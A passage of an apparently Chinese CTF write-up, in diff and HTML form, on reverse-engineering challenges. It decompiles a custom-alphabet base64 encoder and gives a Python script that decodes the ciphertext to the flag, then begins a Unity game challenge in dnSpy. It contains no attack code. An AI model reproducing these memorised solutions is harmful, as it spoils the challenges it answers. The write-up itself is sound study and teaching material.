+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c
+</span></span><span class="line"><span class="cl">_BYTE *__fastcall sub_1400010E0(__int64 a1)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  __int64 v2; // rbx
+</span></span><span class="line"><span class="cl">  __int64 v3; // rbp
+</span></span><span class="line"><span class="cl">  int v4; // edx
+</span></span><span class="line"><span class="cl">  int v5; // edi
+</span></span><span class="line"><span class="cl">  int v6; // edx
+</span></span><span class="line"><span class="cl">  __int64 v7; // r14
+</span></span><span class="line"><span class="cl">  size_t v8; // rcx
+</span></span><span class="line"><span class="cl">  _BYTE *v9; // r8
+</span></span><span class="line"><span class="cl">  __int64 v10; // r9
+</span></span><span class="line"><span class="cl">  unsigned __int64 v11; // rdx
+</span></span><span class="line"><span class="cl">  int v12; // ecx
+</span></span><span class="line"><span class="cl">  unsigned int v13; // ecx
+</span></span><span class="line"><span class="cl">  unsigned int v14; // eax
+</span></span><span class="line"><span class="cl">  int v15; // eax
+</span></span><span class="line"><span class="cl">  int v16; // eax
+</span></span><span class="line"><span class="cl">  int v17; // eax
+</span></span><span class="line"><span class="cl">  int v18; // edi
+</span></span><span class="line"><span class="cl">  __int64 v19; // rdx
+</span></span><span class="line"><span class="cl">  int v20; // eax
+</span></span><span class="line"><span class="cl">  int v21; // eax
+</span></span><span class="line"><span class="cl">  int v22; // ecx
+</span></span><span class="line"><span class="cl">  unsigned int v23; // edx
+</span></span><span class="line"><span class="cl">  int v24; // ecx
+</span></span><span class="line"><span class="cl">  int v25; // eax
+</span></span><span class="line"><span class="cl">  int v26; // ecx
+</span></span><span class="line"><span class="cl">  unsigned int v27; // ecx
+</span></span><span class="line"><span class="cl">  unsigned int v28; // eax
+</span></span><span class="line"><span class="cl">  char v30[80]; // [rsp+20h] [rbp-68h] BYREF
+</span></span><span class="line"><span class="cl">  int v31; // [rsp+90h] [rbp+8h]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  v2 = -1i64;
+</span></span><span class="line"><span class="cl">  strcpy(v30, &#34;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&#34;);
+</span></span><span class="line"><span class="cl">  do
+</span></span><span class="line"><span class="cl">    ++v2;
+</span></span><span class="line"><span class="cl">  while ( *(_BYTE *)(a1 + v2) );
+</span></span><span class="line"><span class="cl">  v3 = 0i64;
+</span></span><span class="line"><span class="cl">  v4 = (int)v2 / 3;
+</span></span><span class="line"><span class="cl">  if ( (_DWORD)v2 == 3 * ((int)v2 / 3) )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    v5 = 0;
+</span></span><span class="line"><span class="cl">    v6 = 4 * v4;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  else if ( (int)v2 % 3 == 1 )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    v5 = 1;
+</span></span><span class="line"><span class="cl">    v6 = 4 * v4 + 4;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  else if ( (int)v2 % 3 == 2 )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    v5 = 2;
+</span></span><span class="line"><span class="cl">    v6 = 4 * v4 + 4;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  else
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    v5 = v31;
+</span></span><span class="line"><span class="cl">    v6 = v31;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  v7 = v6;
+</span></span><span class="line"><span class="cl">  v8 = v6 + 1i64;
+</span></span><span class="line"><span class="cl">  if ( v6 == -1i64 )
+</span></span><span class="line"><span class="cl">    v8 = -1i64;
+</span></span><span class="line"><span class="cl">  v9 = malloc(v8);
+</span></span><span class="line"><span class="cl">  if ( (int)v2 - v5 &gt; 0 )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    v10 = a1 + 2;
+</span></span><span class="line"><span class="cl">    v11 = ((int)v2 - v5 - 1i64) / 3ui64 + 1;
+</span></span><span class="line"><span class="cl">    do
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">      v3 += 4i64;
+</span></span><span class="line"><span class="cl">      v12 = *(unsigned __int8 *)(v10 - 2) &gt;&gt; 2;
+</span></span><span class="line"><span class="cl">      v10 += 3i64;
+</span></span><span class="line"><span class="cl">      v13 = v12 + 24;
+</span></span><span class="line"><span class="cl">      v14 = v13 - 64;
+</span></span><span class="line"><span class="cl">      if ( v13 &lt;= 0x40 )
+</span></span><span class="line"><span class="cl">        v14 = v13;
+</span></span><span class="line"><span class="cl">      v9[v3 - 4] = v30[v14];
+</span></span><span class="line"><span class="cl">      v15 = ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3))) - 40;
+</span></span><span class="line"><span class="cl">      if ( ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3u))) + 24 &lt;= 0x40 )
+</span></span><span class="line"><span class="cl">        v15 = ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3))) + 24;
+</span></span><span class="line"><span class="cl">      v9[v3 - 3] = v30[v15];
+</span></span><span class="line"><span class="cl">      v16 = ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xF))) - 40;
+</span></span><span class="line"><span class="cl">      if ( ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xFu))) + 24 &lt;= 0x40 )
+</span></span><span class="line"><span class="cl">        v16 = ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xF))) + 24;
+</span></span><span class="line"><span class="cl">      v9[v3 - 2] = v30[v16];
+</span></span><span class="line"><span class="cl">      v17 = (*(_BYTE *)(v10 - 3) &amp; 0x3F) - 40;
+</span></span><span class="line"><span class="cl">      if ( (*(_BYTE *)(v10 - 3) &amp; 0x3Fu) + 24 &lt;= 0x40 )
+</span></span><span class="line"><span class="cl">        v17 = (*(_BYTE *)(v10 - 3) &amp; 0x3F) + 24;
+</span></span><span class="line"><span class="cl">      v9[v3 - 1] = v30[v17];
+</span></span><span class="line"><span class="cl">      --v11;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    while ( v11 );
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  v18 = v5 - 1;
+</span></span><span class="line"><span class="cl">  if ( !v18 )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) - 40;
+</span></span><span class="line"><span class="cl">    if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) + 24 &lt;= 0x40u )
+</span></span><span class="line"><span class="cl">      v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) + 24;
+</span></span><span class="line"><span class="cl">    v9[v7 - 4] = v30[v25];
+</span></span><span class="line"><span class="cl">    v26 = *(_BYTE *)((int)v2 + a1 - 1) &amp; 3;
+</span></span><span class="line"><span class="cl">    *(_WORD *)&amp;v9[v7 - 2] = 15677;
+</span></span><span class="line"><span class="cl">    v27 = 16 * v26 + 24;
+</span></span><span class="line"><span class="cl">    v28 = v27 - 64;
+</span></span><span class="line"><span class="cl">    if ( v27 &lt;= 0x40 )
+</span></span><span class="line"><span class="cl">      v28 = v27;
+</span></span><span class="line"><span class="cl">    v9[v7 - 3] = v30[v28];
+</span></span><span class="line"><span class="cl">    goto LABEL_37;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  if ( v18 != 1 )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">LABEL_37:
+</span></span><span class="line"><span class="cl">    v9[v7] = 0;
+</span></span><span class="line"><span class="cl">    return v9;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  v19 = a1 + (int)v2;
+</span></span><span class="line"><span class="cl">  v20 = (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) - 40;
+</span></span><span class="line"><span class="cl">  if ( (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) + 24 &lt;= 0x40u )
+</span></span><span class="line"><span class="cl">    v20 = (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) + 24;
+</span></span><span class="line"><span class="cl">  v9[v7 - 4] = v30[v20];
+</span></span><span class="line"><span class="cl">  v21 = ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3))) - 40;
+</span></span><span class="line"><span class="cl">  if ( ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3u))) + 24 &lt;= 0x40 )
+</span></span><span class="line"><span class="cl">    v21 = ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3))) + 24;
+</span></span><span class="line"><span class="cl">  v9[v7 - 3] = v30[v21];
+</span></span><span class="line"><span class="cl">  v22 = *(_BYTE *)(v19 - 1) &amp; 0xF;
+</span></span><span class="line"><span class="cl">  *(_WORD *)&amp;v9[v7 - 1] = 61;
+</span></span><span class="line"><span class="cl">  v23 = 4 * v22 + 24;
+</span></span><span class="line"><span class="cl">  v24 = 4 * v22 - 40;
+</span></span><span class="line"><span class="cl">  if ( v23 &lt;= 0x40 )
+</span></span><span class="line"><span class="cl">    v24 = v23;
+</span></span><span class="line"><span class="cl">  v9[v7 - 2] = v30[v24];
+</span></span><span class="line"><span class="cl">  return v9;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们看到魔改的base64编码表 <code>GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI</code></p>
+<p>通过读源码我们得知，程序将输入的flag使用自定义的base64编码表进行加密，得到字符串 <code>AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=</code></p>
+<p>我们逆向逻辑编写脚本得到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">custom_b64decode</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 自定义编码表</span>
+</span></span><span class="line"><span class="cl">    <span class="n">table</span> <span class="o">=</span> <span class="s2">&#34;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 创建解码字典：字符 -&gt; (原始值 -24) mod 64</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decode_table</span> <span class="o">=</span> <span class="p">{</span><span class="n">c</span><span class="p">:</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">24</span><span class="p">)</span> <span class="o">%</span> <span class="mi">64</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">enumerate</span><span class="p">(</span><span class="n">table</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 处理填充并分割成4字符一组</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">encoded_str</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;==&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pad</span> <span class="o">=</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encoded_str</span> <span class="o">=</span> <span class="n">encoded_str</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;AA&#39;</span>  <span class="c1"># 替换填充为可处理的字符</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">encoded_str</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pad</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encoded_str</span> <span class="o">=</span> <span class="n">encoded_str</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span>  <span class="c1"># 替换填充</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 转换为二进制值列表</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decoded_values</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">encoded_str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decoded_values</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">decode_table</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>  <span class="c1"># 未知字符视为0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 将4个6位值转换为3个字节</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">bytearray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">len</span><span class="p">(</span><span class="n">decoded_values</span><span class="p">),</span> <span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">decoded_values</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">+=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="n">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 合并成24位整数</span>
+</span></span><span class="line"><span class="cl">        <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">18</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">chunk</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 拆分为3字节</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bytes_group</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">val</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 处理填充截断</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">len</span><span class="p">(</span><span class="n">decoded_values</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">pad</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">bytes_group</span> <span class="o">=</span> <span class="n">bytes_group</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">pad</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">bytes_group</span> <span class="o">=</span> <span class="n">bytes_group</span><span class="p">[:</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">bytes_group</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bytes</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 目标加密后的Base64字符串</span>
+</span></span><span class="line"><span class="cl"><span class="n">encoded</span> <span class="o">=</span> <span class="s2">&#34;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">custom_b64decode</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到flag</p>
+<hr>
+<h2 id="水果忍者">水果忍者
+</h2><p>很熟悉的水果忍者小游戏，许多年之后，面对Unity逆向坐牢，我将会回想起，我在卧室偷偷用家长手机玩游戏的那个遥远的晚上（bushi）。</p>
+<p>用 dnSpy打开，定位到 Assembly_CSharp -&gt; GameManager</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c#
+</span></span><span class="line"><span class="cl">using System;
+</span></span><span class="line"><span class="cl">using System.Collections;
+</span></span><span class="line"><span class="cl">using System.IO;
+</span></span><span class="line"><span class="cl">using System.Security.Cryptography;
+</span></span><span class="line"><span class="cl">using System.Text;
+</span></span><span class="line"><span class="cl">using UnityEngine;
+</span></span><span class="line"><span class="cl">using UnityEngine.UI;
